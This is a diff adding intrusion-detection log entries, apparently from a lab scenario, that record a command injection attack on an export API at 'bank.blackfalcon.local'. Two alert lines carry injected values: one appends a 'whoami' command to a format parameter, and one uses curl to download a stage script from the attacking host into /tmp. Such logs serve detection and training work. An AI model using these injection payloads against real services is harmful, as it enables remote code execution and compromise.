@@ -1,0 +1,11 @@
+{"timestamp":"2026-08-21T10:31:01.110+0530","event_type":"http","src_ip":"192.168.56.101","src_port":54001,"dest_ip":"192.168.56.10","dest_port":80,"http":{"hostname":"bank.blackfalcon.local","url":"/api/status","http_method":"GET","http_user_agent":"Mozilla/5.0"}}
+
+{"timestamp":"2026-08-21T10:31:19.441+0530","event_type":"http","src_ip":"192.168.56.106","src_port":54110,"dest_ip":"192.168.56.10","dest_port":80,"http":{"hostname":"bank.blackfalcon.local","url":"/api/export?format=csv","http_method":"GET","http_user_agent":"Mozilla/5.0"}}
+
+{"timestamp":"2026-08-21T10:32:04.771+0530","event_type":"alert","src_ip":"192.168.56.104","src_port":49820,"dest_ip":"192.168.56.10","dest_port":80,"proto":"TCP","http":{"hostname":"bank.blackfalcon.local","url":"/api/export?format=csv%3Bwhoami","http_method":"GET"},"alert":{"signature":"ET WEB_SERVER Suspicious Shell Metacharacter in URI","category":"Web Application Attack","severity":1}}
+
+{"timestamp":"2026-08-21T10:32:09.301+0530","event_type":"alert","src_ip":"192.168.56.104","src_port":49831,"dest_ip":"192.168.56.10","dest_port":80,"proto":"TCP","http":{"hostname":"bank.blackfalcon.local","url":"/api/export?format=csv%3Bcurl%20http%3A%2F%2F192.168.56.104%2Fstage%2Fbfstage.sh%20-o%20%2Ftmp%2Fbfstage.sh","http_method":"GET"},"alert":{"signature":"ET WEB_SERVER Possible Command Injection","category":"Web Application Attack","severity":1}}
+
+{"timestamp":"2026-08-21T10:32:13.821+0530","event_type":"alert","src_ip":"192.168.56.10","src_port":52811,"dest_ip":"192.168.56.104","dest_port":80,"proto":"TCP","alert":{"signature":"ET POLICY Executable or Script Download from Untrusted Host","category":"Potentially Bad Traffic","severity":1}}
+
+{"timestamp":"2026-08-21T10:33:01.410+0530","event_type":"http","src_ip":"192.168.56.101","src_port":54221,"dest_ip":"192.168.56.10","dest_port":80,"http":{"hostname":"bank.blackfalcon.local","url":"/api/export?format=pdf","http_method":"GET","http_user_agent":"Mozilla/5.0"}}
